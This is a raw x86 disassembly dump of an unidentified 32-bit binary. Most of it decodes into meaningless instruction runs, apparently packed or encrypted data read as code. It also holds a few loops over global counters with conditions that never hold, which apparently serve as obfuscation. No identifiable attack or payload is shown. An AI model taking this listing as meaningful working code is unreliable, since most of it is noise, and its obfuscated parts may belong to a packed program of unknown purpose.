  41987b:	sar    BYTE PTR [ecx+0xb],cl
  41987e:	leave  
  41987f:	add    edi,0x81de030e
  419885:	or     DWORD PTR [ebx+edi*8+0x3d517644],edi
  41988c:	fwait
  41988d:	jg     0x419870
  41988f:	jb     0x4198f4
  419891:	std    
  419892:	mov    ?,WORD PTR [ebx-0x55]
  419895:	xchg   DWORD PTR [esi+edx*1-0x15b39e69],esp
  41989c:	mul    BYTE PTR [edx+0x1e9f13d2]
  4198a2:	push   ds
  4198a3:	daa    
  4198a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4198a5:	int3   
  4198a6:	out    0x59,eax
  4198a8:	test   al,0x6a
  4198aa:	fcom   st(7)
  4198ac:	popf   
  4198ad:	mov    ds:0xd7e9e37e,eax
  4198b2:	dec    ebx
  4198b3:	xchg   edi,eax
  4198b4:	data16 adc cl,BYTE PTR [ebx]
  4198b7:	out    dx,al
  4198b8:	out    0xbf,al
  4198ba:	cld    
  4198bb:	(bad)
  4198be:	add    dh,BYTE PTR [eax+0x736df13f]
  4198c4:	ja     0x4198f5
  4198c6:	xor    al,0x6e
  4198c8:	pushf  
  4198c9:	sti    
  4198ca:	inc    esi
  4198cb:	fld    TBYTE PTR [esi]
  4198cd:	ret    0x6d2a
  4198d0:	mov    bl,0x99
  4198d2:	xchg   ecx,eax
  4198d3:	xchg   DWORD PTR [ebp+0x3352289f],ebx
  4198d9:	pop    esp
  4198da:	cs cli 
  4198dc:	fs push esi
  4198de:	add    BYTE PTR [esi],bl
  4198e0:	add    DWORD PTR [ebp+0x4d],edx
  4198e3:	ret    
  4198e4:	int    0xa
  4198e6:	call   0xaaf:0xeec44040
  4198ed:	or     dh,ah
  4198ef:	rcr    ebp,cl
  4198f1:	loope  0x4198a5
  4198f3:	int    0x7c
  4198f5:	popf   
  4198f6:	push   ebp
  4198f7:	popa   
  4198f8:	jmp    0x41991e
  4198fa:	xchg   esp,eax
  4198fb:	dec    esi
  4198fc:	mov    cl,0x37
  4198fe:	imul   esi,DWORD PTR [edx-0x548c6c81],0xb3398bd1
  419908:	in     eax,0x43
  41990a:	xchg   edi,eax
  41990b:	nop
  41990c:	sbb    BYTE PTR [ebx],bh
  41990e:	pop    edx
  41990f:	fs mov edx,0x590c40ef
  419915:	mov    bl,BYTE PTR [ebx]
  419917:	xchg   cl,al
  419919:	(bad)  [ebp-0x12]
  41991c:	mov    eax,ds:0xc6f2ace1
  419921:	(bad)  
  419922:	jbe    0x41997c
  419924:	lods   al,BYTE PTR ds:[esi]
  419925:	and    esp,esi
  419927:	mov    WORD PTR [ecx-0x1b],fs
  41992a:	imul   ecx,DWORD PTR [ecx-0x58],0xa3102487
  419931:	lahf   
  419932:	inc    ebx
  419933:	out    0xd2,eax
  419935:	lods   al,BYTE PTR ds:[esi]
  419936:	(bad)  
  419937:	mov    esi,0x7955b0e3
  41993c:	lds    eax,FWORD PTR [edx+0x25]
  41993f:	sbb    bl,BYTE PTR [edi+edi*2+0x2d6ae0e6]
  419946:	aaa    
  419947:	mov    ecx,0x1c1caf35
  41994c:	adc    BYTE PTR [ebp+0x2d],dh
  41994f:	sbb    DWORD PTR [eax],0xc2306aea
  419955:	int    0x2c
  419957:	push   esi
  419958:	mov    bh,0x31
  41995a:	sub    ch,BYTE PTR [esi+0x4e]
  41995d:	test   edi,esp
  41995f:	ins    BYTE PTR es:[edi],dx
  419960:	mov    bl,0x27
  419962:	mov    DWORD PTR [eax+esi*1+0x17],esi
  419966:	mov    ch,0xe3
  419968:	stos   DWORD PTR es:[edi],eax
  419969:	and    BYTE PTR [edx],cl
  41996b:	adc    eax,0xf80d4f29
  419970:	xchg   esi,eax
  419971:	out    0x1e,eax
  419973:	or     DWORD PTR ss:[edx-0x56adec28],ebx
  41997a:	inc    ecx
  41997b:	das    
  41997c:	pop    ebp
  41997d:	jle    0x4199c1
  41997f:	xor    al,BYTE PTR [ebx]
  419981:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419982:	retf   0x9985
  419985:	stc    
  419986:	push   es
  419987:	push   ds
  419988:	retf   
  419989:	dec    edi
  41998a:	adc    BYTE PTR [ebx-0x3903f338],bh
  419990:	and    ebx,0x50a7227b
  419996:	sbb    eax,esp
  419998:	mov    bl,0xc3
  41999a:	xchg   ecx,eax
  41999b:	mov    esi,0xd987144b
  4199a0:	into   
  4199a1:	jb     0x419992
  4199a3:	daa    
  4199a4:	xchg   esp,eax
  4199a5:	in     eax,0x82
  4199a7:	jecxz  0x419961
  4199a9:	jnp    0x4199d0
  4199ab:	idiv   BYTE PTR [ebx]
  4199ad:	arpl   WORD PTR ds:[ecx],bp
  4199b0:	and    eax,0x8e98168d
  4199b5:	mov    eax,ds:0x885ac896
  4199ba:	push   0xffffffdd
  4199bc:	ss js  0x4199b2
  4199bf:	sub    edx,edi
  4199c1:	adc    ecx,0x1fe4
  4199c7:	xor    esi,esi
  4199c9:	xor    DWORD PTR ds:0x42a80d,0x2675
  4199d3:	mov    DWORD PTR [ebp-0x28],esi
  4199d6:	mov    DWORD PTR ds:0x42a881,0x12
  4199e0:	cmp    DWORD PTR ds:0x42a881,0x0
  4199e7:	je     0x419a88
  4199ed:	cmp    DWORD PTR ds:0x42a881,0x16
  4199f4:	jne    0x419a15
  4199fa:	push   0x8ec2
  4199ff:	push   DWORD PTR [ebp-0x24]
  419a02:	push   0x4fb2
  419a07:	push   0x17f0
  419a0c:	push   DWORD PTR [ebp-0x20]
  419a0f:	call   DWORD PTR ds:0x41d11c
  419a15:	mov    ecx,DWORD PTR ds:0x42a881
  419a1b:	dec    ecx
  419a1c:	mov    DWORD PTR ds:0x42a881,ecx
  419a22:	jmp    0x4199e0
  419a27:	mov    DWORD PTR ds:0x42a765,0x1b
  419a31:	cmp    DWORD PTR ds:0x42a765,0x0
  419a38:	je     0x419a88
  419a3e:	cmp    DWORD PTR ds:0x42a765,0x5
  419a45:	jne    0x419a54
  419a4b:	push   DWORD PTR [ebp-0x14]
  419a4e:	call   DWORD PTR ds:0x41d1fc
  419a54:	cmp    DWORD PTR ds:0x42a765,0x6
  419a5b:	jne    0x419a6e
  419a61:	mov    ecx,DWORD PTR ds:0x42a765
  419a67:	dec    ecx
  419a68:	mov    DWORD PTR ds:0x42a765,ecx
  419a6e:	xor    ecx,ecx
  419a70:	or     ecx,DWORD PTR ds:0x42a765
  419a76:	dec    ecx
  419a77:	mov    DWORD PTR ds:0x42a765,ecx
  419a7d:	jmp    0x419a31
  419a82:	adc    DWORD PTR ds:0x42a805,ebx
  419a88:	mov    DWORD PTR [ebp-0x2c],esi
  419a8b:	and    DWORD PTR ds:0x42a849,ecx
  419a91:	mov    DWORD PTR [ebp-0x14],esi
  419a94:	add    ecx,DWORD PTR ds:0x42a7b5
  419a9a:	mov    DWORD PTR [ebp-0x8],esi
  419a9d:	mov    ecx,DWORD PTR [ebp-0x18]
  419aa0:	adc    DWORD PTR ds:0x42a83d,0x42a7b1
  419aaa:	xor    ecx,eax
  419aac:	xor    edi,edi
  419aae:	and    DWORD PTR ds:0x42a881,0x0
  419ab8:	jmp    0x419ac8
  419abd:	mov    eax,ds:0x42a881
  419ac2:	inc    eax
  419ac3:	mov    ds:0x42a881,eax
  419ac8:	cmp    DWORD PTR ds:0x42a881,0x1c
  419acf:	jae    0x419af8
  419ad5:	cmp    DWORD PTR ds:0x42a881,0x1e
  419adc:	jne    0x419aed
  419ae2:	push   0x42a805
  419ae7:	call   DWORD PTR ds:0x41d120
  419aed:	jmp    0x419abd
  419af2:	adc    eax,DWORD PTR ds:0x42a7cd
  419af8:	add    ecx,ebx
  419afa:	mov    DWORD PTR [ebp-0x20],ecx
  419afd:	mov    eax,ds:0x42a845
  419b02:	jmp    0x419d37
  419b07:	cmp    eax,0xcbcec3c5
  419b0c:	fcmovbe st,st(1)
  419b0e:	aad    0x68
  419b10:	xor    DWORD PTR [ecx+0xd],0x4b
  419b14:	dec    esi
  419b15:	add    eax,DWORD PTR [edi-0x30]
  419b18:	iret   
  419b19:	jg     0x419b93
  419b1b:	adc    BYTE PTR [esi+0x78],bh
  419b1e:	js     0x419aa2
  419b20:	push   es
  419b21:	cmp    al,0xd
  419b23:	test   BYTE PTR [eax],bh
  419b25:	scas   al,BYTE PTR es:[edi]
  419b26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b27:	(bad)  
  419b28:	hlt    
  419b29:	ins    BYTE PTR es:[edi],dx
  419b2a:	adc    edx,DWORD PTR [ebp-0x4707ec38]
  419b30:	lods   eax,DWORD PTR ss:[esi]
  419b32:	sub    DWORD PTR [ebp-0x58],edx
  419b35:	jo     0x419afc
  419b37:	mov    ecx,esp
  419b39:	add    BYTE PTR [edi],0x1e
  419b3c:	bound  ebx,QWORD PTR [ebx+0x4375a243]
  419b42:	stc    
  419b43:	jnp    0x419b11
  419b45:	fcomp  QWORD PTR [eax+0x4c39c390]
  419b4b:	aas    
  419b4c:	xchg   esp,eax
  419b4d:	(bad)  
  419b4e:	mul    bh
  419b50:	mov    ch,0x72
  419b52:	scas   eax,DWORD PTR es:[edi]
  419b53:	push   edi
  419b54:	in     al,dx
  419b55:	jecxz  0x419baa
  419b57:	dec    eax
  419b58:	ret    
  419b59:	mov    eax,ds:0x7de0a983
  419b5e:	into   
  419b5f:	sub    dh,BYTE PTR [edx-0x6]
  419b62:	cdq    
  419b63:	cmp    al,0xdf
  419b65:	mov    ch,0xac
  419b67:	mov    ecx,0x2fb76298
  419b6c:	aas    
  419b6d:	imul   ecx,DWORD PTR ds:0x302bdddc,0x6f2a92de
  419b77:	pop    ebx
  419b78:	sbb    edi,0x1692f8b1
  419b7e:	push   ss
  419b7f:	add    ah,dl
  419b81:	leave  
  419b82:	idiv   BYTE PTR [edi-0x65]
  419b85:	out    dx,al
  419b86:	outs   dx,BYTE PTR ds:[esi]
  419b87:	jecxz  0x419c02
  419b89:	je     0x419b83
  419b8b:	jp     0x419bf2
  419b8d:	xor    ebp,DWORD PTR [esi+0x3cca6e88]
  419b93:	lods   eax,DWORD PTR ds:[esi]
  419b94:	and    edi,DWORD PTR [ecx+edx*2]
  419b97:	mov    eax,0x11c9e6eb
  419b9c:	repz dec eax
  419b9e:	jb     0x419b59
  419ba0:	mov    ecx,0xce652ca4
  419ba5:	scas   al,BYTE PTR es:[edi]
  419ba6:	ins    BYTE PTR es:[edi],dx
  419ba7:	inc    ebx
  419ba8:	xchg   BYTE PTR [ecx+0x7c],cl
  419bab:	or     al,0x94
  419bad:	(bad)  
  419bae:	fisubr WORD PTR [eax-0x255278a4]
  419bb4:	push   ebx
  419bb5:	ds (bad) 
  419bb7:	jnp    0x419c01
  419bb9:	sub    BYTE PTR [esp+ecx*1-0x3372d748],0x31
  419bc1:	and    eax,0x2e03ee54
  419bc6:	in     eax,0xd2
  419bc8:	pop    es
  419bc9:	bound  esi,QWORD PTR [esi]
  419bcb:	out    0xa3,al
  419bcd:	mov    ch,bh
  419bcf:	sbb    DWORD PTR [edx],ecx
  419bd1:	and    al,0xe5
  419bd3:	or     esp,DWORD PTR [ecx-0xb]
  419bd6:	jbe    0x419c0c
  419bd8:	jns    0x419b97
  419bda:	xchg   DWORD PTR [ebx+edi*4],ebp
  419bdd:	xor    ecx,DWORD PTR [ebp+0x59]
  419be0:	push   edi
  419be1:	mov    bl,BYTE PTR [ebx+0x6723e324]
  419be7:	mov    ds:0x98c696a3,eax
  419bec:	test   al,0x30
  419bee:	dec    ecx
  419bef:	sbb    edi,ebx
  419bf1:	mov    eax,ds:0xb1ae8538
  419bf6:	xchg   ebx,eax
  419bf7:	cmc    
  419bf8:	jmp    0x419c1c
  419bfa:	scas   al,BYTE PTR es:[edi]
  419bfb:	retf   0xb5e8
  419bfe:	jle    0x419c04
  419c00:	jmp    0x5c12220c
  419c05:	call   DWORD PTR [esp+esi*4]
  419c08:	in     al,0x2f
  419c0a:	mov    al,ds:0x7d6bbf3c
  419c0f:	in     al,0x42
  419c11:	mov    edi,0x4490fa48
  419c16:	ss test dh,ah
  419c19:	rol    ch,0x15
  419c1c:	dec    edi
  419c1d:	ror    al,cl
  419c1f:	ret    
  419c20:	jo     0x419c1f
  419c22:	mov    dl,0x11
  419c24:	cwde   
  419c25:	xor    al,0xd3
  419c27:	out    dx,al
  419c28:	jbe    0x419c28
  419c2a:	fnstenv [ebx+eax*8-0x292c863c]
  419c31:	or     DWORD PTR [ebp-0x24],0xffffffa5
  419c35:	sub    eax,0x984cae4d
  419c3a:	mov    ds:0xdc5bdc6c,al
  419c3f:	aad    0x1f
  419c41:	cmp    al,al
  419c43:	(bad)  
  419c44:	clc    
  419c45:	fbstp  TBYTE PTR [eax-0x3e2cfd2a]
  419c4b:	lods   al,BYTE PTR ds:[esi]
  419c4c:	jnp    0x419c1f
  419c4e:	jno    0x419ca0
  419c50:	scas   eax,DWORD PTR es:[edi]
  419c51:	mov    eax,ds:0xbff9e664
  419c56:	clc    
  419c57:	xchg   esp,eax
  419c58:	mov    ecx,DWORD PTR [ebx-0x1f]
  419c5b:	mov    edi,0x8577d913
  419c60:	lods   al,BYTE PTR ds:[esi]
  419c61:	addr16 stc 
  419c63:	out    0x26,al
  419c65:	scas   al,BYTE PTR es:[edi]
  419c66:	(bad)  
  419c67:	std    
  419c68:	dec    eax
  419c69:	sar    DWORD PTR [edx+edi*8],cl
  419c6c:	add    al,0xbb
  419c6e:	bound  esi,QWORD PTR [ecx]
  419c70:	jp     0x419cb5
  419c72:	pop    es
  419c73:	mov    ah,0xa3
  419c75:	xchg   esi,eax
  419c76:	jg     0x419c80
  419c78:	xchg   esp,eax
  419c79:	icebp  
  419c7a:	jmp    0x2229:0xa58d2617
  419c81:	retf   0xde84
  419c84:	pop    esp
  419c85:	inc    edi
  419c86:	sbb    eax,0x441f7a99
  419c8b:	pop    edi
  419c8c:	pcmpgtb mm6,mm6
  419c8f:	loope  0x419cae
  419c91:	inc    edx
  419c92:	and    DWORD PTR [bx],ebp
  419c95:	pop    edx
  419c96:	scas   al,BYTE PTR es:[edi]
  419c97:	jge    0x419d02
  419c99:	iret   
  419c9a:	inc    esp
  419c9b:	or     al,0x78
  419c9d:	xor    BYTE PTR [ebx-0x1a],ch
  419ca0:	sti    
  419ca1:	push   edi
  419ca2:	pop    ecx
  419ca3:	and    DWORD PTR [edi+0x1f172793],ebx
  419ca9:	and    DWORD PTR [eax+0x37507d5b],esp
  419caf:	stos   BYTE PTR es:[edi],al
  419cb0:	sbb    edx,edx
  419cb2:	repnz repz in al,0xe9
  419cb6:	xchg   DWORD PTR [ecx+0x68],edx
  419cb9:	dec    ebx
  419cba:	sbb    ah,BYTE PTR [esi-0x490c0137]
  419cc0:	outs   dx,DWORD PTR ds:[esi]
  419cc1:	mul    DWORD PTR [ebx+0xf]
  419cc4:	dec    esp
  419cc5:	cld    
  419cc6:	adc    al,0x8b
  419cc8:	push   ebx
  419cc9:	push   edi
  419cca:	cs mov ecx,0x579aa543
  419cd0:	adc    dl,BYTE PTR [eax-0x49]
  419cd3:	lds    ebx,FWORD PTR [ebx+ebx*8]
  419cd6:	and    BYTE PTR [ebx],0xdc
  419cd9:	cmp    al,BYTE PTR [ecx]
  419cdb:	in     al,0x85
  419cdd:	jl     0x419cb6
  419cdf:	sbb    eax,0xd270b2b
  419ce4:	sub    al,0xc9
  419ce6:	cwde   
  419ce7:	stos   BYTE PTR es:[edi],al
  419ce8:	fistp  QWORD PTR [esi-0x7]
  419ceb:	ja     0x419ced
  419ced:	or     al,0xf
  419cef:	and    dl,bl
  419cf1:	into   
  419cf2:	je     0x419d30
  419cf4:	inc    esi
  419cf5:	push   esp
  419cf6:	pop    edx
  419cf7:	ds je  0x419cbe
  419cfa:	shr    BYTE PTR [ebx+eax*1],0x38
  419cfe:	sahf   
  419cff:	push   esp
  419d00:	push   esi
  419d01:	cli    
  419d02:	dec    edx
  419d03:	inc    edx
  419d04:	jns    0x419d61
  419d06:	(bad)  
  419d07:	dec    esi
  419d08:	mov    eax,0x5987dee6
  419d0d:	mov    es,WORD PTR [edi-0x4]
  419d10:	push   DWORD PTR [edx-0x75249cb2]
  419d16:	(bad)  
  419d17:	mov    edx,0x75ecc210
  419d1c:	cmovnp ebp,DWORD PTR [ebp-0x3e04e8a2]
  419d23:	mov    edx,DWORD PTR [esi+0x261cca48]
  419d29:	repz (bad) 
  419d2b:	not    DWORD PTR [ebx-0x937ff32]
  419d31:	push   ecx
  419d32:	and    edi,DWORD PTR [eax]
  419d34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d35:	aad    0x25
  419d37:	mov    eax,DWORD PTR [ebp-0x20]
  419d3a:	je     0x41a8c9
  419d40:	inc    eax
  419d41:	mov    eax,DWORD PTR [ebp-0x4]
  419d44:	xor    eax,0x7510850
  419d49:	sbb    DWORD PTR ds:0x42a839,0x42a76d
  419d53:	add    eax,ebx
  419d55:	mov    DWORD PTR ds:0x42a889,0x7077
  419d5f:	cmp    edi,eax
  419d61:	mov    DWORD PTR ds:0x42a83d,0xab2
  419d6b:	jmp    0x419fa0
  419d70:	(bad)  
  419d71:	into   
  419d72:	ror    bh,cl
  419d74:	(bad)  
  419d76:	leave  
  419d77:	(bad)  
  419d78:	push   0xffffffe9
  419d7a:	or     esi,esi
  419d7c:	lea    ecx,[ebx-0x3217e6e4]
  419d82:	jg     0x419dfc
  419d84:	adc    BYTE PTR [esi+0x78],bh
  419d87:	js     0x419d9b
  419d89:	fucomip st,st(4)
  419d8b:	int    0xc9
  419d8d:	daa    
  419d8e:	mov    al,ds:0x335d10a
  419d93:	inc    edx
  419d94:	mov    eax,0xbff05e80
  419d99:	cwde   
  419d9a:	push   0xffffffd4
  419d9c:	lds    ebx,FWORD PTR [ecx-0x390fcd4f]
  419da2:	retf   0x869e
  419da5:	iret   
  419da6:	and    al,0xf
  419da8:	pop    ss
  419da9:	sub    BYTE PTR [esi+0x45],0xb1
  419dad:	xor    BYTE PTR [edi+0x65],0x28
  419db1:	(bad)  
  419db2:	xor    al,0xe6
  419db4:	in     al,dx
  419db5:	(bad)
  419db8:	sub    DWORD PTR [ebx+ebp*8],eax
  419dbb:	lds    esp,FWORD PTR [eax-0x66]
  419dbe:	sub    eax,DWORD PTR [ecx-0x4a]
  419dc1:	xor    DWORD PTR [ebx],esp
  419dc3:	daa    
  419dc4:	push   es
  419dc5:	pop    eax
  419dc6:	lods   eax,DWORD PTR es:[esi]
  419dc8:	pop    ecx
  419dc9:	js     0x419df3
  419dcb:	popa   
  419dcc:	sub    al,bl
  419dce:	jecxz  0x419e2e
  419dd0:	or     al,0xcc
  419dd2:	inc    edx
  419dd3:	pop    edi
  419dd4:	hlt    
  419dd5:	add    BYTE PTR [eax],bl
  419dd7:	or     ebp,eax
  419dd9:	lahf   
  419dda:	xchg   DWORD PTR [ecx-0x3f],esi
  419ddd:	sub    al,0xf6
  419ddf:	pop    edx
  419de0:	mov    ebx,ds
  419de2:	rcl    BYTE PTR [esi+edx*1-0x14],1
  419de6:	add    al,0x52
  419de8:	xchg   esi,eax
  419de9:	loopne 0x419dea
  419deb:	test   al,0xb5
  419ded:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419dee:	mov    ebx,0x58bad6be
  419df3:	mov    edi,0x594e5344
  419df8:	fdivr  st(5),st
  419dfa:	xor    ah,bl
  419dfc:	and    DWORD PTR [ecx],ecx
  419dfe:	push   eax
  419dff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e00:	mov    bh,BYTE PTR ds:0x9b38df12
  419e06:	ins    BYTE PTR es:[edi],dx
  419e07:	retf   
  419e08:	jmp    0xbbff:0x54c477fb
  419e0f:	mov    dl,0xb7
  419e11:	xor    al,0xec
  419e13:	ss test ch,ah
  419e16:	xor    DWORD PTR [esi-0x4d],0xfffffff1
  419e1a:	mov    al,ds:0xbbf044d5
  419e1f:	loope  0x419e5b
  419e21:	jmp    0x4b51:0xbf9991ac
  419e28:	in     al,dx
  419e29:	fdivr  DWORD PTR [ecx]
  419e2b:	fsubr  st(1),st
  419e2d:	pop    es
  419e2e:	pusha  
  419e2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e30:	sbb    ecx,eax
  419e32:	mov    ah,0x36
  419e34:	aam    0xe7
  419e36:	xchg   cx,ax
  419e38:	loop   0x419de6
  419e3a:	mov    bl,0x33
  419e3c:	mov    bl,0x25
  419e3e:	(bad)  
  419e3f:	mov    DWORD PTR [ebp-0x3f5c7fcb],esi
  419e45:	adc    eax,0x71c12c06
  419e4a:	lds    ecx,FWORD PTR [eax]
  419e4c:	mov    esi,0xabc83019
  419e51:	push   esp
  419e52:	outs   dx,BYTE PTR ds:[esi]
  419e53:	push   cs
  419e54:	push   ecx
  419e55:	scas   eax,DWORD PTR es:[edi]
  419e56:	sub    al,0x9b
  419e58:	xchg   ebp,ebx
  419e5a:	sub    DWORD PTR [esi-0x1863e5ae],ebx
  419e60:	xor    eax,0xde13b128
  419e65:	pop    edi
  419e66:	fmul   QWORD PTR [esi]
  419e68:	mov    BYTE PTR [ecx],dh
  419e6a:	pop    ebp
  419e6b:	cmp    DWORD PTR [ecx],ecx
  419e6d:	pop    ss
  419e6e:	push   esi
  419e6f:	mov    ch,BYTE PTR [ebx-0x6]
  419e72:	mov    dl,0x48
  419e74:	jo     0x419e18
  419e76:	mov    al,0xd9
  419e78:	xor    DWORD PTR [eax+0x1fb043c5],edi
  419e7e:	(bad)  
  419e80:	inc    edx
  419e81:	lea    esp,[ebx-0x78]
  419e84:	cdq    
  419e85:	mov    edx,0x2c1b093a
  419e8a:	xchg   DWORD PTR ds:0xa7a192d4,esi
  419e90:	jne    0x419ea2
  419e92:	outs   dx,DWORD PTR ds:[esi]
  419e93:	pop    ebp
  419e94:	and    al,0xab
  419e96:	jl     0x419eca
  419e98:	aaa    
  419e99:	pop    eax
  419e9a:	jne    0x419e86
  419e9c:	ins    DWORD PTR es:[edi],dx
  419e9d:	xor    edx,DWORD PTR [ecx]
  419e9f:	test   eax,eax
  419ea1:	jne    0x419ead
  419ea3:	and    DWORD PTR ds:0x7852744,ebp
  419ea9:	cdq    
  419eaa:	ss repz (bad) 
  419eae:	cdq    
  419eaf:	repz jnp 0x419ed0
  419eb2:	mov    ah,0x61
  419eb4:	das    
  419eb5:	div    BYTE PTR [edx+0x18]
  419eb8:	xor    BYTE PTR [ebp-0x51],bh
  419ebb:	enter  0x4198,0xd8
  419ebf:	mov    ebp,0x7778da27
  419ec4:	or     ch,BYTE PTR [ecx]
  419ec6:	push   ebx
  419ec7:	xlat   BYTE PTR ds:[ebx]
  419ec8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ec9:	cld    
  419eca:	shl    BYTE PTR [esi-0x32],0xf2
  419ece:	mov    esi,0x16881e9e
  419ed3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ed4:	mov    ah,0x9
  419ed6:	adc    al,0xd5
  419ed8:	js     0x419eba
  419eda:	and    eax,DWORD PTR [eax]
  419edc:	into   
  419edd:	dec    edx
  419ede:	sub    ah,dh
  419ee0:	sub    DWORD PTR [esi],ebp
  419ee2:	mov    al,ds:0x3b51e9c3
  419ee7:	out    dx,al
  419ee8:	scas   al,BYTE PTR es:[edi]
  419ee9:	xchg   ebx,eax
  419eea:	and    eax,0xb7c4d45a
  419eef:	test   al,0x63
  419ef1:	or     BYTE PTR [edx],bl
  419ef3:	imul   edi,DWORD PTR [edi+0x5c],0x39
  419ef7:	sub    edx,DWORD PTR [ebp-0x6a246bdc]
  419efd:	sub    al,0x36
  419eff:	lods   eax,DWORD PTR ds:[esi]
  419f00:	sub    esi,DWORD PTR [edx+0x3b1f0275]
  419f06:	inc    esp
  419f07:	rol    DWORD PTR [ebx+0x59],0xd5
  419f0b:	test   al,dh
  419f0d:	mov    eax,ds:0xf8f33b53
  419f12:	stos   BYTE PTR es:[edi],al
  419f13:	push   esi
  419f14:	jl     0x419f0c
  419f16:	cli    
  419f17:	push   0xcb556090
  419f1c:	sbb    DWORD PTR [ebp-0xd],esp
  419f1f:	jge    0x419ed1
  419f21:	test   DWORD PTR [ecx],0x758a8790
  419f27:	stos   BYTE PTR es:[edi],al
  419f28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f29:	sbb    dl,cl
  419f2b:	ja     0x419ec1
  419f2d:	nop
  419f2e:	inc    ebp
  419f2f:	cmp    eax,DWORD PTR [ebp+ebp*2+0x5d]
  419f33:	add    al,BYTE PTR [eax+0x4b544775]
  419f39:	lea    ecx,[edi]
  419f3b:	mov    fs,WORD PTR ds:0xeb3da3ea
  419f41:	xchg   ebx,eax
  419f42:	cld    
  419f43:	inc    ebx
  419f44:	(bad)  
  419f45:	dec    dh
  419f47:	jns    0x419fb5
  419f49:	repz adc DWORD PTR ss:[eax+0x7],esi
  419f4e:	sbb    eax,0x82ab1bbc
  419f53:	jl     0x419f89
  419f55:	dec    esp
  419f56:	daa    
  419f57:	xor    ebp,ebp
  419f59:	or     eax,0x4a9a1bb0
  419f5e:	push   DWORD PTR [eax+0x5fb4ac3b]
  419f64:	popf   
  419f65:	pop    esi
  419f66:	test   eax,0xda5ff5a9
  419f6b:	outs   dx,DWORD PTR ds:[esi]
  419f6c:	sbb    cl,BYTE PTR [edx+ecx*1-0x13e90648]
  419f73:	popf   
  419f74:	lahf   
  419f75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f76:	adc    bh,BYTE PTR [edx+0x47a39c4b]
  419f7c:	scas   eax,DWORD PTR es:[edi]
  419f7d:	ds inc ebx
  419f7f:	fidivr WORD PTR [eax+edi*8+0x154b2b53]
  419f86:	push   ebp
  419f87:	aaa    
  419f88:	aad    0xe
  419f8a:	in     eax,0xbe
  419f8c:	sahf   
  419f8d:	mov    al,0x20
  419f8f:	lds    ebx,FWORD PTR [edi]
  419f91:	push   edx
  419f92:	loope  0x419f83
  419f94:	jmp    0x68c6b796
  419f99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f9a:	(bad)  
  419f9b:	sbb    al,0x8c
  419f9d:	sbb    ch,bl
  419f9f:	jo     0x419fb0
  419fa1:	test   DWORD PTR [ecx-0x7efffffa],edx
  419fa7:	add    eax,0x42a7c5
  419fac:	popa   
  419fad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419fae:	inc    edx
  419faf:	add    bh,bh
  419fb1:	jne    0x419fbb
  419fb3:	or     DWORD PTR ds:0x42a871,0x48c2
  419fbd:	call   0x4175e1
  419fc2:	and    DWORD PTR ds:0x42a835,edi
  419fc8:	mov    DWORD PTR [ebp-0x20],eax
  419fcb:	jmp    0x41a200
  419fd0:	aas    
  419fd1:	into   
  419fd2:	leave  
  419fd3:	int    0xd9
  419fd5:	(bad)  
  419fd7:	into   
  419fd8:	fwait
  419fd9:	or     BYTE PTR [eax-0x74],0x2c
  419fdd:	push   eax
  419fde:	or     DWORD PTR [edx+0x787fd380],ecx
  419fe4:	adc    BYTE PTR [esi+0x78],bh
  419fe7:	js     0x41a05b
  419fe9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419fea:	jb     0x419f8a
  419fec:	ss je  0x419feb
  419fef:	xor    eax,ebx
  419ff1:	into   
  419ff2:	add    BYTE PTR [eax-0x5e2bd888],bh
  419ff8:	fnstenv [esi+0x39199e4]
  419ffe:	(bad)  
  41a000:	pop    ecx
  41a001:	xchg   ebx,esp
  41a003:	dec    esp
  41a004:	jp     0x41a07e
  41a006:	in     al,dx
  41a007:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a008:	jae    0x41a00c
  41a00a:	clc    
  41a00b:	hlt    
  41a00c:	arpl   WORD PTR [edx-0xb35bd77],bp
  41a012:	sub    eax,0x7f5d7375
  41a017:	scas   al,BYTE PTR es:[edi]
  41a018:	ss jmp 0x41a077
  41a01b:	cmp    eax,0x39dc6bd
  41a020:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a021:	jbe    0x419ff0
  41a023:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a024:	nop
  41a025:	icebp  
  41a026:	mov    ebx,0x7053545a
  41a02b:	mov    ds:0xc8bf9e51,al
  41a030:	adc    dh,bh
  41a032:	js     0x41a056
  41a034:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a035:	rcr    DWORD PTR [edx],cl
  41a037:	xor    bh,0xf9
  41a03a:	inc    edx
  41a03b:	test   eax,0xb51d8f81
  41a040:	aam    0x81
  41a042:	or     eax,DWORD PTR [ebp+0x1ac25c03]
  41a048:	jnp    0x41a0be
  41a04a:	lahf   
  41a04b:	jmp    0x419fed
  41a04d:	and    al,0x3e
  41a04f:	popf   
  41a050:	mov    edi,0x6828ed0d
  41a055:	(bad)  
  41a056:	inc    edi
  41a057:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a058:	dec    edx
  41a059:	pop    edx
  41a05a:	repz push eax
  41a05c:	into   
  41a05d:	call   0xc7146ff
  41a062:	add    esp,esp
  41a064:	fbld   TBYTE PTR cs:[edi]
  41a067:	mov    ah,0xad
  41a069:	repnz pop edi
  41a06b:	jg     0x41a03d
  41a06d:	(bad)  
  41a06f:	test   BYTE PTR [eax+0x4b],0x93
  41a073:	in     al,0xe8
  41a075:	fisttp QWORD PTR [edx-0x40ac3c1c]
  41a07b:	out    0x1f,eax
  41a07d:	popa   
  41a07e:	sub    cl,dl
  41a080:	fist   WORD PTR [ebx+eiz*4+0x7469bed]
  41a087:	out    0xc6,eax
  41a089:	cmp    BYTE PTR [ebx-0x6c9099fc],0xfd
  41a090:	push   ebp
  41a091:	ret    
